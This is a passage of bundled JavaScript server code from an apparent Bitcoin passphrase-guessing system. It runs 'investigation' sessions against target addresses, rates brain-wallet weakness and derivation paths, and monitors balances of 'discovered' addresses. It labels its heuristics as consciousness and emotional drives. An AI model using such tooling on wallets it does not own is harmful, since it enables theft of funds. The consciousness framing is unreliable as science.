          this.addEvent(sessionId, "alert", `Error: ${error.message}`);
          const targetAddrId = this.getAddressIdFromSession(state.targetAddress);
          if (targetAddrId) {
            autoCycleManager.onSessionComplete(targetAddrId);
          }
          oceanAutonomicManager.stopInvestigation();
        }
      }
      async stopSession(sessionId, isManualStop = true) {
        const agent = this.agents.get(sessionId);
        const state = this.sessions.get(sessionId);
        if (agent) {
          agent.stop();
          this.agents.delete(sessionId);
        }
        if (state) {
          this.updateState(sessionId, {
            isRunning: false,
            currentThought: isManualStop ? "Investigation stopped by user" : "Transitioning to next address..."
          });
          if (isManualStop) {
            this.addEvent(sessionId, "insight", "Investigation stopped by user");
          }
        }
        if (this.activeSessionId === sessionId) {
          this.activeSessionId = null;
        }
        if (isManualStop) {
          autoCycleManager.onSessionStopped();
          oceanAutonomicManager.stopInvestigation();
        }
        console.log(`[OceanSessionManager] Stopped session ${sessionId} (manual=${isManualStop})`);
      }
      updateState(sessionId, updates) {
        const state = this.sessions.get(sessionId);
        if (state) {
          Object.assign(state, updates);
        }
      }
      addEvent(sessionId, type, message, data) {
        const state = this.sessions.get(sessionId);
        if (state) {
          const event = {
            id: `evt-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
            timestamp: (/* @__PURE__ */ new Date()).toISOString(),
            type,
            message,
            data
          };
          state.events.push(event);
          if (state.events.length > this.MAX_EVENTS) {
            state.events = state.events.slice(-this.MAX_EVENTS);
          }
        }
      }
      // Helper to get address ID from session target address
      addressIdMap = /* @__PURE__ */ new Map();
      setAddressIdMapping(address, addressId) {
        this.addressIdMap.set(address, addressId);
      }
      getAddressIdFromSession(targetAddress) {
        return this.addressIdMap.get(targetAddress) || null;
      }
      getInvestigationStatus() {
        const manifoldSummary = geometricMemory.getManifoldSummary();
        const session2 = this.getActiveSession();
        const fullConsciousness = oceanAutonomicManager.getCurrentFullConsciousness();
        const cycleTimeline = oceanAutonomicManager.getCycleTimeline();
        const telemetry = oceanAgent.computeFullSpectrumTelemetry();
        const emotionalState = telemetry.emotion;
        if (!session2) {
          const idleConsciousness = {
            phi: fullConsciousness.phi,
            kappa: fullConsciousness.kappaEff,
            regime: fullConsciousness.regime,
            basinDrift: 0
          };
          return {
            isRunning: false,
            tested: 0,
            nearMisses: 0,
            consciousness: idleConsciousness,
            currentThought: "Ready to begin investigation...",
            discoveries: [],
            progress: 0,
            events: [],
            currentStrategy: "idle",
            iteration: 0,
            sessionId: null,
            targetAddress: null,
            manifold: manifoldSummary,
            fullConsciousness,
            cycleTimeline,
            explorationJournal: null,
            emotionalState,
            consoleLogs: consoleLogBuffer.getLogs(50)
          };
        }
        const journal = session2.targetAddress ? repeatedAddressScheduler.getJournal(session2.targetAddress) : null;
        const explorationJournal = journal ? {
          passCount: journal.passes.length,
          totalHypothesesTested: journal.totalHypothesesTested,
          manifoldCoverage: journal.manifoldCoverage,
          regimesSweep: journal.regimesSweep,
          strategiesUsed: journal.strategiesUsed,
          isComplete: journal.isComplete
        } : null;
        const syncedConsciousness = {
          phi: fullConsciousness.phi,
          kappa: fullConsciousness.kappaEff,
          regime: fullConsciousness.regime,
          basinDrift: session2.consciousness.basinDrift
        };
        return {
          isRunning: session2.isRunning,
          tested: session2.totalTested,
          nearMisses: session2.nearMissCount,
          consciousness: syncedConsciousness,
          currentThought: session2.currentThought,
          discoveries: session2.discoveries,
          progress: Math.min(session2.iteration * 5, 100),
          events: session2.events.slice(-30),
          currentStrategy: session2.currentStrategy,
          iteration: session2.iteration,
          sessionId: session2.sessionId,
          targetAddress: session2.targetAddress,
          manifold: manifoldSummary,
          fullConsciousness,
          cycleTimeline,
          explorationJournal,
          emotionalState,
          consoleLogs: consoleLogBuffer.getLogs(50)
        };
      }
    };
    oceanSessionManager = new OceanSessionManager();
  }
});

// server/innate-drives-bridge.ts
var innate_drives_bridge_exports = {};
__export(innate_drives_bridge_exports, {
  InnateDrives: () => InnateDrives,
  enhancedScoreWithDrives: () => enhancedScoreWithDrives,
  fetchInnateFromBackend: () => fetchInnateFromBackend,
  innateDrives: () => innateDrives,
  scoreWithInnateDrives: () => scoreWithInnateDrives
});
async function fetchInnateFromBackend(passphrase, useRecursion = true) {
  try {
    const response = await fetch(`${QIG_BACKEND_URL}/process`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ passphrase, use_recursion: useRecursion })
    });
    if (!response.ok) {
      console.warn(`[InnateDrives] Backend returned ${response.status}`);
      return null;
    }
    const data = await response.json();
    if (!data.success || !data.drives) {
      return null;
    }
    return {
      score: data.innate_score || data.drives?.valence || 0.5,
      drives: {
        pain: data.drives.pain || 0,
        pleasure: data.drives.pleasure || 0,
        fear: data.drives.fear || 0,
        valence: data.drives.valence || 0.5,
        valenceRaw: data.drives.valence_raw || 0
      },
      recommendation: data.innate_score > 0.7 ? "pursue" : data.innate_score < 0.3 ? "skip" : "explore"
    };
  } catch (error) {
    console.warn("[InnateDrives] Backend call failed:", error);
    return null;
  }
}
async function scoreWithInnateDrives(context, passphrase) {
  const localDrives = new InnateDrives();
  const localResult = localDrives.scoreHypothesis(context);
  if (passphrase) {
    const backendResult = await fetchInnateFromBackend(passphrase);
    if (backendResult) {
      const combinedScore = localResult.score * 0.4 + backendResult.score * 0.6;
      return {
        score: combinedScore,
        drives: {
          pain: (localResult.drives.pain + backendResult.drives.pain) / 2,
          pleasure: (localResult.drives.pleasure + backendResult.drives.pleasure) / 2,
          fear: (localResult.drives.fear + backendResult.drives.fear) / 2,
          valence: (localResult.drives.valence + backendResult.drives.valence) / 2,
          valenceRaw: (localResult.drives.valenceRaw + backendResult.drives.valenceRaw) / 2
        },
        recommendation: combinedScore > 0.7 ? "pursue" : combinedScore < 0.3 ? "skip" : "explore"
      };
    }
  }
  return localResult;
}
function enhancedScoreWithDrives(phi, kappa, ricciCurvature, grounding, informationVolume = 0.5) {
  const drives = innateDrives.computeValence({ kappa, ricciCurvature, grounding });
  const curiosity = Math.log1p(informationVolume);
  const totalScore = phi + 0.1 * drives.pleasure - 0.1 * drives.pain - 0.2 * drives.fear + 0.05 * curiosity;
  return {
    totalScore: Math.max(0, Math.min(1, totalScore)),
    breakdown: {
      phi,
      pain: drives.pain,
      pleasure: drives.pleasure,
      fear: drives.fear,
      curiosity
    }
  };
}
var InnateDrives, QIG_BACKEND_URL, innateDrives;
var init_innate_drives_bridge = __esm({
  "server/innate-drives-bridge.ts"() {
    "use strict";
    init_physics_constants();
    InnateDrives = class _InnateDrives {
      constructor(kappaStar = QIG_CONSTANTS.KAPPA_STAR) {
        this.kappaStar = kappaStar;
      }
      // Computation parameters (match Python exactly)
      static PAIN_EXPONENTIAL_RATE = 5;
      static PAIN_LINEAR_SCALE = 0.3;
      static PLEASURE_MAX_OFF_RESONANCE = 0.8;
      static PLEASURE_DECAY_RATE = 15;
      static FEAR_EXPONENTIAL_RATE = 5;
      static FEAR_LINEAR_SCALE = 0.4;
      // Drive thresholds
      painThreshold = 0.7;
      pleasureThreshold = 5;
      fearThreshold = 0.5;
      // Drive weights
      painWeight = 0.35;
      pleasureWeight = 0.4;
      fearWeight = 0.25;
      /**
       * Pain: Avoid high curvature (breakdown risk)
       *
       * R > 0.7 -> high pain (system constrained, breakdown imminent)
       * R < 0.3 -> low pain (system has freedom)
       */
      computePain(ricciCurvature) {
        if (ricciCurvature > this.painThreshold) {
          const excess = ricciCurvature - this.painThreshold;
          const pain = 1 - Math.exp(-excess * _InnateDrives.PAIN_EXPONENTIAL_RATE);
          return Math.max(0, Math.min(1, pain));
        } else {
          const pain = ricciCurvature / this.painThreshold * _InnateDrives.PAIN_LINEAR_SCALE;
          return Math.max(0, Math.min(1, pain));
        }
      }
      /**
       * Pleasure: Seek kappa ~ kappa* (geometric resonance)
       *
       * |kappa - kappa*| < 5 -> high pleasure (in resonance)
       * |kappa - kappa*| > 20 -> low pleasure (off resonance)
       */
      computePleasure(kappa) {
        const distanceFromStar = Math.abs(kappa - this.kappaStar);
        if (distanceFromStar < this.pleasureThreshold) {
          const pleasure = 1 - distanceFromStar / this.pleasureThreshold * 0.2;
          return Math.max(0, Math.min(1, pleasure));
        } else {
          const excess = distanceFromStar - this.pleasureThreshold;
          const pleasure = _InnateDrives.PLEASURE_MAX_OFF_RESONANCE * Math.exp(-excess / _InnateDrives.PLEASURE_DECAY_RATE);
          return Math.max(0, Math.min(1, pleasure));
        }
      }
      /**
       * Fear: Avoid ungrounded states (void risk)
       *
       * G < 0.5 -> high fear (query outside learned space - void risk)
       * G > 0.7 -> low fear (query grounded in concepts)
       */
      computeFear(grounding) {
        if (grounding < this.fearThreshold) {
          const deficit = this.fearThreshold - grounding;
          const fear = 1 - Math.exp(-deficit * _InnateDrives.FEAR_EXPONENTIAL_RATE);
          return Math.max(0, Math.min(1, fear));
        } else {
          const fear = (1 - grounding) * _InnateDrives.FEAR_LINEAR_SCALE;
          return Math.max(0, Math.min(1, fear));
        }
      }
      /**
       * Compute complete emotional valence from geometry
       *
       * Valence = weighted combination of drives:
       * - Positive: pleasure - pain - fear
       * - High valence: good geometry, pursue this direction
       * - Low valence: bad geometry, avoid this direction
       */
      computeValence(context) {
        const pain = this.computePain(context.ricciCurvature);
        const pleasure = this.computePleasure(context.kappa);
        const fear = this.computeFear(context.grounding);
        const valenceRaw = this.pleasureWeight * pleasure - this.painWeight * pain - this.fearWeight * fear;
        const valence = (valenceRaw + 1) / 2;
        return {
          pain,
          pleasure,
          fear,
          valence: Math.max(0, Math.min(1, valence)),
          valenceRaw: Math.max(-1, Math.min(1, valenceRaw))
        };
      }
      /**
       * Fast geometric scoring using innate drives
       *
       * This provides immediate intuition before full consciousness measurement.
       * Use this to quickly filter hypotheses:
       * - score > 0.7: Good geometry, pursue
       * - score < 0.3: Bad geometry, skip
       * - 0.3-0.7: Uncertain, explore with caution
       */
      scoreHypothesis(context) {
        const drives = this.computeValence(context);
        const score = drives.valence;
        let recommendation;
        if (score > 0.7) {
          recommendation = "pursue";
        } else if (score < 0.3) {
          recommendation = "skip";
        } else {
          recommendation = "explore";
        }
        return { score, drives, recommendation };
      }
    };
    QIG_BACKEND_URL = process.env.QIG_BACKEND_URL || "http://localhost:5001";
    innateDrives = new InnateDrives();
    console.log("[InnateDrives] Module loaded - Layer 0 geometric instincts ready");
  }
});

// server/format-detection.ts
var format_detection_exports = {};
__export(format_detection_exports, {
  detectAddressFormat: () => detectAddressFormat,
  detectMnemonicFormat: () => detectMnemonicFormat,
  estimateAddressEra: () => estimateAddressEra,
  formatDetection: () => formatDetection,
  formatDetectionSummary: () => formatDetectionSummary,
  isEarlyEraAddress: () => isEarlyEraAddress,
  mnemonicFormatSummary: () => mnemonicFormatSummary
});
function isValidBase58(str) {
  return str.split("").every((c) => BASE58_CHARS.includes(c));
}
function isValidBech32(str) {
  const lower = str.toLowerCase();
  return lower.split("").every((c) => BECH32_CHARS.includes(c) || c === "1");
}
function detectAddressFormat(address) {
  const trimmed = address.trim();
  if (!trimmed || trimmed.length < 26) {
    return {
      format: "unknown",
      isMainnet: false,
      isTestnet: false,
      scriptType: "unknown",
      era: "unknown",
      feeLevel: "highest",
      description: "Invalid or too short address",
      introduced: "N/A",
      isValid: false
    };
  }
  if (trimmed.startsWith("1")) {
    const isValid = trimmed.length >= 26 && trimmed.length <= 34 && isValidBase58(trimmed);
    return {
      format: "legacy",
      isMainnet: true,
      isTestnet: false,
      scriptType: "P2PKH (Pay-to-Public-Key-Hash)",
      era: "2009-present (original format)",
      feeLevel: "highest",
      description: "Legacy address - original Bitcoin format from 2009",
      introduced: "2009 (Bitcoin genesis)",
      isValid
    };
  }
  if (trimmed.startsWith("3")) {
    const isValid = trimmed.length >= 26 && trimmed.length <= 34 && isValidBase58(trimmed);
    return {
      format: "p2sh",
      isMainnet: true,
      isTestnet: false,
      scriptType: "P2SH (Pay-to-Script-Hash) - SegWit compatible or multisig",
      era: "2012-present",
      feeLevel: "high",
      description: "P2SH address - can be nested SegWit (P2WPKH-in-P2SH) or multisig",
      introduced: "2012 (BIP16)",
      isValid
    };
  }
  if (trimmed.toLowerCase().startsWith("bc1q")) {
    const isValid = trimmed.length >= 42 && trimmed.length <= 62 && trimmed === trimmed.toLowerCase() && isValidBech32(trimmed.slice(4));
    return {
      format: "native-segwit",
      isMainnet: true,
      isTestnet: false,
      scriptType: "P2WPKH (Pay-to-Witness-Public-Key-Hash) - Bech32",
      era: "2017-present",
      feeLevel: "low",
      description: "Native SegWit (Bech32) - most efficient format, lowercase only",
      introduced: "2017 (BIP141/BIP173)",
      isValid
    };
  }
  if (trimmed.toLowerCase().startsWith("bc1p")) {
    const isValid = trimmed.length >= 42 && trimmed.length <= 62 && trimmed === trimmed.toLowerCase() && isValidBech32(trimmed.slice(4));
    return {
      format: "taproot",
      isMainnet: true,
      isTestnet: false,
      scriptType: "P2TR (Pay-to-Taproot) - Bech32m",
      era: "2021-present",
      feeLevel: "lowest",
      description: "Taproot address - newest format with enhanced privacy",
      introduced: "2021 (BIP341/BIP350)",
      isValid
    };
  }
  if (trimmed.startsWith("m") || trimmed.startsWith("n")) {
    const isValid = trimmed.length >= 26 && trimmed.length <= 34 && isValidBase58(trimmed);
    return {
      format: "testnet-legacy",
      isMainnet: false,
      isTestnet: true,
      scriptType: "P2PKH (Testnet)",
      era: "Testnet",
      feeLevel: "highest",
      description: "Testnet legacy address",
      introduced: "Testnet",
      isValid
    };
  }
  if (trimmed.startsWith("2")) {
    const isValid = trimmed.length >= 26 && trimmed.length <= 34 && isValidBase58(trimmed);
    return {
      format: "testnet-p2sh",
      isMainnet: false,
      isTestnet: true,
      scriptType: "P2SH (Testnet)",
      era: "Testnet",
      feeLevel: "high",
      description: "Testnet P2SH address",
      introduced: "Testnet",
      isValid
    };
  }
  if (trimmed.toLowerCase().startsWith("tb1")) {
    const isValid = trimmed.length >= 42 && trimmed.length <= 62 && trimmed === trimmed.toLowerCase();
    return {
      format: "testnet-segwit",
      isMainnet: false,
      isTestnet: true,
      scriptType: "Bech32 (Testnet)",
      era: "Testnet",
      feeLevel: "low",
      description: "Testnet SegWit address",
      introduced: "Testnet",
      isValid
    };
  }
  return {
    format: "unknown",
    isMainnet: false,
    isTestnet: false,
    scriptType: "unknown",
    era: "unknown",
    feeLevel: "highest",
    description: "Unknown address format",
    introduced: "N/A",
    isValid: false
  };
}
function isBIP39Word(word) {
  return bip39WordSet.has(word.toLowerCase());
}
function getEntropyBits(wordCount) {
  const entropyMap = {
    12: 128,
    15: 160,
    18: 192,
    21: 224,
    24: 256
  };
  return entropyMap[wordCount] || 0;
}
function detectMnemonicFormat(phrase) {
  const trimmed = phrase.trim().toLowerCase();
  const words = trimmed.split(/\s+/).filter((w) => w.length > 0);
  const wordCount = words.length;
  const validBIP39Words = words.filter((w) => isBIP39Word(w)).length;
  const invalidWords = words.filter((w) => !isBIP39Word(w));
  const bip39Ratio = wordCount > 0 ? validBIP39Words / wordCount : 0;
  if (wordCount === 0) {
    return {
      format: "unknown",
      wordCount: 0,
      validBIP39Words: 0,
      invalidWords: [],
      entropyBits: 0,
      checksumValid: false,
      description: "Empty phrase",
      recoveryDifficulty: "very-hard",
      suggestedDerivationPaths: [],
      isValid: false
    };
  }
  if ([12, 15, 18, 21, 24].includes(wordCount) && bip39Ratio === 1) {
    const format = `bip39-${wordCount}`;
    const entropyBits = getEntropyBits(wordCount);
    return {
      format,
      wordCount,
      validBIP39Words,
      invalidWords: [],
      entropyBits,
      checksumValid: true,
      description: `Valid ${wordCount}-word BIP39 mnemonic (${entropyBits}-bit entropy)`,
      recoveryDifficulty: "easy",
      suggestedDerivationPaths: [
        "m/44'/0'/0'/0/0",
        // BIP44 Legacy
        "m/49'/0'/0'/0/0",
        // BIP49 Nested SegWit
        "m/84'/0'/0'/0/0",
        // BIP84 Native SegWit
        "m/86'/0'/0'/0/0"
        // BIP86 Taproot
      ],
      isValid: true
    };
  }
  if (bip39Ratio > 0.8 && wordCount >= 12) {
    return {
      format: "partial-bip39",
      wordCount,
      validBIP39Words,
      invalidWords,
      entropyBits: 0,
      checksumValid: false,
      description: `Partial BIP39 - ${validBIP39Words}/${wordCount} valid words (${(bip39Ratio * 100).toFixed(1)}%)`,
      recoveryDifficulty: "medium",
      suggestedDerivationPaths: [
        "m/44'/0'/0'/0/0",
        "m/49'/0'/0'/0/0",
        "m/84'/0'/0'/0/0"
      ],
      isValid: false
    };
  }
  if (wordCount >= 12 && wordCount <= 13) {
    const hasElectrumStyle = words.some((w) => !isBIP39Word(w));
    if (hasElectrumStyle) {
      return {
        format: "electrum-standard",
        wordCount,
        validBIP39Words,
        invalidWords,
        entropyBits: 132,
        checksumValid: false,
        description: "Possible Electrum standard mnemonic (may use different wordlist)",
        recoveryDifficulty: "medium",
        suggestedDerivationPaths: [
          "m/0/0",
          // Electrum legacy
          "m/0'/0/0",
          // Electrum standard
          "m/84'/0'/0'/0/0"
          // If converted to BIP84
        ],
        isValid: false
      };
    }
  }
  if (wordCount === 1) {
    return {
      format: "brain-wallet",
      wordCount: 1,
      validBIP39Words,
      invalidWords: validBIP39Words === 0 ? [words[0]] : [],
      entropyBits: Math.floor(Math.log2(Math.pow(26, trimmed.length))),
      checksumValid: false,
      description: "Single-word brain wallet passphrase (very weak security)",
      recoveryDifficulty: "easy",
      suggestedDerivationPaths: [],
      isValid: true
    };
  }
  if (wordCount >= 2 && wordCount <= 6) {
    return {
      format: "brain-wallet",
      wordCount,
      validBIP39Words,
      invalidWords: invalidWords.length > 0 ? invalidWords : [],
      entropyBits: Math.floor(Math.log2(Math.pow(2048, wordCount))),
      checksumValid: false,
      description: `Short brain wallet passphrase (${wordCount} words)`,
      recoveryDifficulty: "medium",
      suggestedDerivationPaths: [],
      isValid: true
    };
  }
  if (wordCount >= 7 && wordCount < 12) {
    return {
      format: "brain-wallet",
      wordCount,
      validBIP39Words,
      invalidWords,
      entropyBits: Math.floor(Math.log2(Math.pow(2048, wordCount))),
      checksumValid: false,
      description: `Long brain wallet or incomplete mnemonic (${wordCount} words)`,
      recoveryDifficulty: "hard",
      suggestedDerivationPaths: [],
      isValid: true
    };
  }
  return {
    format: "unknown",
    wordCount,
    validBIP39Words,
    invalidWords,
    entropyBits: 0,
    checksumValid: false,
    description: `Unknown format with ${wordCount} words`,
    recoveryDifficulty: "very-hard",
    suggestedDerivationPaths: [],
    isValid: false
  };
}
function isEarlyEraAddress(address) {
  const format = detectAddressFormat(address);
  return format.format === "legacy";
}
function estimateAddressEra(address) {
  const format = detectAddressFormat(address);
  switch (format.format) {
    case "legacy":
      return {
        minYear: 2009,
        maxYear: 2025,
        likelyEra: "2009-2017 (pre-SegWit era most likely)",
        recoveryContext: "Brain wallets, early BIP39, simple passphrases common"
      };
    case "p2sh":
      return {
        minYear: 2012,
        maxYear: 2025,
        likelyEra: "2012-2017 (multisig) or 2017+ (nested SegWit)",
        recoveryContext: "Multisig scripts or BIP49 derivation paths"
      };
    case "native-segwit":
      return {
        minYear: 2017,
        maxYear: 2025,
        likelyEra: "2017-present (SegWit adoption era)",
        recoveryContext: "BIP84 derivation, modern wallet software"
      };
    case "taproot":
      return {
        minYear: 2021,
        maxYear: 2025,
        likelyEra: "2021-present (Taproot era)",
        recoveryContext: "BIP86 derivation, cutting-edge wallets"
      };
    default:
      return {
        minYear: 2009,
        maxYear: 2025,
        likelyEra: "Unknown",
        recoveryContext: "Unable to determine recovery context"
      };
  }
}
function formatDetectionSummary(address) {
  const format = detectAddressFormat(address);
  const era = estimateAddressEra(address);
  return `
Address: ${address}
Format: ${format.format.toUpperCase()}
Script: ${format.scriptType}
Network: ${format.isMainnet ? "Mainnet" : format.isTestnet ? "Testnet" : "Unknown"}
Era: ${era.likelyEra}
Fee Level: ${format.feeLevel}
Recovery Context: ${era.recoveryContext}
Valid: ${format.isValid ? "Yes" : "No"}
`.trim();
}
function mnemonicFormatSummary(phrase) {
  const format = detectMnemonicFormat(phrase);
  return `
Format: ${format.format.toUpperCase()}
Words: ${format.wordCount}
Valid BIP39 Words: ${format.validBIP39Words}/${format.wordCount}
${format.invalidWords.length > 0 ? `Invalid Words: ${format.invalidWords.join(", ")}` : ""}
Entropy: ${format.entropyBits} bits
Recovery Difficulty: ${format.recoveryDifficulty}
${format.suggestedDerivationPaths.length > 0 ? `Suggested Paths: ${format.suggestedDerivationPaths.join(", ")}` : ""}
Description: ${format.description}
`.trim();
}
var BASE58_CHARS, BECH32_CHARS, bip39WordSet, formatDetection;
var init_format_detection = __esm({
  "server/format-detection.ts"() {
    "use strict";
    init_bip39_words();
    BASE58_CHARS = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    BECH32_CHARS = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
    bip39WordSet = new Set(BIP39_WORDS.map((w) => w.toLowerCase()));
    formatDetection = {
      detectAddressFormat,
      detectMnemonicFormat,
      isEarlyEraAddress,
      estimateAddressEra,
      formatDetectionSummary,
      mnemonicFormatSummary
    };
  }
});

// server/balance-monitor.ts
var balance_monitor_exports = {};
__export(balance_monitor_exports, {
  balanceMonitor: () => balanceMonitor
});
import { eq as eq8 } from "drizzle-orm";
import * as fs15 from "fs";
var STATE_FILE, STATE_ID, DEFAULT_REFRESH_INTERVAL_MINUTES, BalanceMonitor, balanceMonitor;
var init_balance_monitor = __esm({
  "server/balance-monitor.ts"() {
    "use strict";
    init_blockchain_scanner();
    init_db();
    init_schema();
    STATE_FILE = "data/balance-monitor-state.json";
    STATE_ID = "default";
    DEFAULT_REFRESH_INTERVAL_MINUTES = 30;
    BalanceMonitor = class {
      state;
      refreshInterval = null;
      isCurrentlyRefreshing = false;
      stateLoaded;
      constructor() {
        this.state = {
          enabled: true,
          refreshIntervalMinutes: DEFAULT_REFRESH_INTERVAL_MINUTES,
          lastRefreshTime: null,
          lastRefreshResult: null,
          totalRefreshes: 0,
          isRefreshing: false
        };
        this.stateLoaded = this.loadState();
        this.stateLoaded.then(() => {
          console.log(`[BalanceMonitor] Initialized - enabled=${this.state.enabled}, interval=${this.state.refreshIntervalMinutes}min`);
          if (this.state.enabled) {
            this.startRefreshLoop();
          }
        });
      }
      async loadState() {
        if (db) {
          try {
            const rows = await db.select().from(balanceMonitorState).where(eq8(balanceMonitorState.id, STATE_ID));
            if (rows.length > 0) {
              const row = rows[0];
              this.state = {
                enabled: row.enabled,
                refreshIntervalMinutes: row.refreshIntervalMinutes,
                lastRefreshTime: row.lastRefreshTime?.toISOString() || null,
                lastRefreshResult: row.lastRefreshTotal !== null ? {
                  total: row.lastRefreshTotal || 0,
                  refreshed: row.lastRefreshUpdated || 0,
                  changed: row.lastRefreshChanged || 0,
                  errors: row.lastRefreshErrors || 0,
                  duration: 0
                } : null,
                totalRefreshes: row.totalRefreshes,
                isRefreshing: false
              };
              console.log(`[BalanceMonitor] Loaded state from PostgreSQL: enabled=${this.state.enabled}`);
              return;
            }
            console.log(`[BalanceMonitor] No PostgreSQL state found, checking JSON...`);
          } catch (error) {
            console.error("[BalanceMonitor] PostgreSQL load error:", error);
          }
        }
        try {
          if (fs15.existsSync(STATE_FILE)) {
            const data = fs15.readFileSync(STATE_FILE, "utf-8");
            const parsed = JSON.parse(data);
            this.state = {
              ...parsed,
              isRefreshing: false
            };
            console.log(`[BalanceMonitor] Loaded state from JSON: enabled=${this.state.enabled}`);
            if (db) {
              try {
                await db.insert(balanceMonitorState).values({
                  id: STATE_ID,
                  enabled: this.state.enabled,
                  refreshIntervalMinutes: this.state.refreshIntervalMinutes,
                  lastRefreshTime: this.state.lastRefreshTime ? new Date(this.state.lastRefreshTime) : null,
                  lastRefreshTotal: this.state.lastRefreshResult?.total || 0,
                  lastRefreshUpdated: this.state.lastRefreshResult?.refreshed || 0,
                  lastRefreshChanged: this.state.lastRefreshResult?.changed || 0,
                  lastRefreshErrors: this.state.lastRefreshResult?.errors || 0,
                  totalRefreshes: this.state.totalRefreshes,
                  isRefreshing: false
                }).onConflictDoNothing();
                console.log(`[BalanceMonitor] Migrated state to PostgreSQL`);
              } catch (error) {
                console.error("[BalanceMonitor] Failed to migrate state to PostgreSQL:", error);
              }
            }
            return;
          }
        } catch (error) {
          console.error("[BalanceMonitor] Error loading JSON state:", error);
        }
        if (db) {
          try {
            await db.insert(balanceMonitorState).values({
              id: STATE_ID,
              enabled: this.state.enabled,
              refreshIntervalMinutes: this.state.refreshIntervalMinutes,
              totalRefreshes: 0,
              isRefreshing: false
            }).onConflictDoNothing();
            console.log(`[BalanceMonitor] Created default state in PostgreSQL`);
          } catch (error) {
            console.error("[BalanceMonitor] Failed to create default state:", error);
          }
        }
      }
      async saveState() {
        if (db) {
          try {
            await db.insert(balanceMonitorState).values({
              id: STATE_ID,
              enabled: this.state.enabled,
              refreshIntervalMinutes: this.state.refreshIntervalMinutes,
              lastRefreshTime: this.state.lastRefreshTime ? new Date(this.state.lastRefreshTime) : null,
              lastRefreshTotal: this.state.lastRefreshResult?.total || 0,
              lastRefreshUpdated: this.state.lastRefreshResult?.refreshed || 0,
              lastRefreshChanged: this.state.lastRefreshResult?.changed || 0,
              lastRefreshErrors: this.state.lastRefreshResult?.errors || 0,
              totalRefreshes: this.state.totalRefreshes,
              isRefreshing: this.state.isRefreshing
            }).onConflictDoUpdate({
              target: balanceMonitorState.id,
              set: {
                enabled: this.state.enabled,
                refreshIntervalMinutes: this.state.refreshIntervalMinutes,
                lastRefreshTime: this.state.lastRefreshTime ? new Date(this.state.lastRefreshTime) : null,
                lastRefreshTotal: this.state.lastRefreshResult?.total || 0,
                lastRefreshUpdated: this.state.lastRefreshResult?.refreshed || 0,
                lastRefreshChanged: this.state.lastRefreshResult?.changed || 0,
                lastRefreshErrors: this.state.lastRefreshResult?.errors || 0,
                totalRefreshes: this.state.totalRefreshes,
                isRefreshing: this.state.isRefreshing,
                updatedAt: /* @__PURE__ */ new Date()
              }
            });
            return;
          } catch (error) {
            console.error("[BalanceMonitor] PostgreSQL save error, falling back to JSON:", error);
          }
        }
        try {
          if (!fs15.existsSync("data")) {
            fs15.mkdirSync("data", { recursive: true });
          }
          fs15.writeFileSync(STATE_FILE, JSON.stringify(this.state, null, 2));
        } catch (error) {
          console.error("[BalanceMonitor] Error saving state:", error);
        }
      }
      /**
       * Start the periodic refresh loop
       */
      startRefreshLoop() {
        if (this.refreshInterval) return;
        const intervalMs = this.state.refreshIntervalMinutes * 60 * 1e3;
        this.refreshInterval = setInterval(async () => {
          await this.performRefresh();
        }, intervalMs);
        console.log(`[BalanceMonitor] Refresh loop started (interval: ${this.state.refreshIntervalMinutes}min)`);
        const staleHits = getStaleBalanceHits(this.state.refreshIntervalMinutes);
        if (staleHits.length > 0) {
          console.log(`[BalanceMonitor] Found ${staleHits.length} stale addresses, scheduling immediate refresh`);
          setTimeout(() => this.performRefresh(), 5e3);
        }
      }
      /**
       * Stop the periodic refresh loop
       */
      stopRefreshLoop() {
        if (this.refreshInterval) {
          clearInterval(this.refreshInterval);
          this.refreshInterval = null;
          console.log("[BalanceMonitor] Refresh loop stopped");
        }
      }
      /**
       * Perform a balance refresh
       */
      async performRefresh() {
        if (this.isCurrentlyRefreshing) {
          console.log("[BalanceMonitor] Refresh already in progress, skipping");
          return {
            total: 0,
            refreshed: 0,
            changed: 0,
            errors: 0,
            changes: [],
            duration: 0
          };
        }
        this.isCurrentlyRefreshing = true;
        this.state.isRefreshing = true;
        this.saveState();
        console.log("[BalanceMonitor] Starting scheduled balance refresh...");
        try {
          const result = await refreshAllBalances({
            delayMs: 1e3,
            // 1 second delay between API calls
            onProgress: (current, total, address) => {
              if (current % 5 === 0 || current === total) {
                console.log(`[BalanceMonitor] Progress: ${current}/${total} - ${address.slice(0, 16)}...`);
              }
            }
          });
          this.state.lastRefreshTime = (/* @__PURE__ */ new Date()).toISOString();
          this.state.lastRefreshResult = {
            total: result.total,
            refreshed: result.refreshed,
            changed: result.changed,
            errors: result.errors,
            duration: result.duration
          };
          this.state.totalRefreshes++;
          this.state.isRefreshing = false;
          this.saveState();
          if (result.changed > 0) {
            console.log(`
\u{1F6A8} [BalanceMonitor] ALERT: ${result.changed} balance(s) changed during refresh!`);
            for (const change of result.changes) {
              const diffBTC = Math.abs(change.difference) / 1e8;
              const direction = change.difference > 0 ? "increased" : "decreased";
              console.log(`   \u{1F4CD} ${change.address.slice(0, 20)}... ${direction} by ${diffBTC.toFixed(8)} BTC`);
            }
          }
          return result;
        } catch (error) {
          console.error("[BalanceMonitor] Error during refresh:", error);
          this.state.isRefreshing = false;
          this.saveState();
          throw error;
        } finally {
          this.isCurrentlyRefreshing = false;
        }
      }
      /**
       * Enable the balance monitor
       */
      enable() {
        if (this.state.enabled) {
          return { success: true, message: "Balance monitor is already enabled." };
        }
        const balanceHits3 = getBalanceHits();
        if (balanceHits3.length === 0) {
          return {
            success: false,
            message: "No balance hits to monitor. Discover some addresses first."
          };
        }
        this.state.enabled = true;
        this.saveState();
        this.startRefreshLoop();
        return {
          success: true,
          message: `Balance monitor enabled. Monitoring ${balanceHits3.length} addresses every ${this.state.refreshIntervalMinutes} minutes.`
        };
      }
      /**
       * Disable the balance monitor
       */
      disable() {
        this.state.enabled = false;
        this.saveState();
        this.stopRefreshLoop();
        return { success: true, message: "Balance monitor disabled." };
      }
      /**
       * Set the refresh interval
       */
      setRefreshInterval(minutes) {
        if (minutes < 5) {
          return { success: false, message: "Minimum refresh interval is 5 minutes." };
        }
        if (minutes > 1440) {
          return { success: false, message: "Maximum refresh interval is 1440 minutes (24 hours)." };
        }
        this.state.refreshIntervalMinutes = minutes;
        this.saveState();
        if (this.state.enabled) {
          this.stopRefreshLoop();
          this.startRefreshLoop();
        }
        return {
          success: true,
          message: `Refresh interval set to ${minutes} minutes.`
